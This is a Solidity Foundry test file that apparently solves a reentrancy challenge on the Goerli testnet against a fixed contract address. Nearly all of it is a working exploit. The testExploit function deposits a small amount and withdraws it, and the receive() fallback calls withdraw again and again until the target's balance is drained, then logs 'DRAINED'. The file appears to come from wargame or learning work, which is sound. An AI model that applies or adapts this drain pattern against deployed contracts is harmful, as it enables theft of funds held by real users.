// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Counter.sol";

contract ReentranceTest is Test {
    uint256 goerliFork;

    address constant cAddress = 0x42948f4F9dc90C82D69F31E8D210AAD04459A075;
    IReentrance constant c = IReentrance(cAddress);

    string GOERLI_RPC_URL = vm.envString("GOERLI_RPC_URL");

    function setUp() public {
        goerliFork = vm.createFork(GOERLI_RPC_URL);
        vm.selectFork(goerliFork);
    }

    function testExploit() public {
        console.log("CONTRACT BALANCE: ", address(cAddress).balance);
        c.donate{value: 0.0001 ether}(address(this));
        c.withdraw(0.0001 ether);
    }

    receive() external payable {
        console.log("RECEIVED: ", msg.value);
        if (address(cAddress).balance >= 0.0001 ether) {
            c.withdraw(0.0001 ether);
        } else {
            console.log("DRAINED");
            console.log("CONTRACT BALANCE: ", address(cAddress).balance);
        }
    }
}

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}
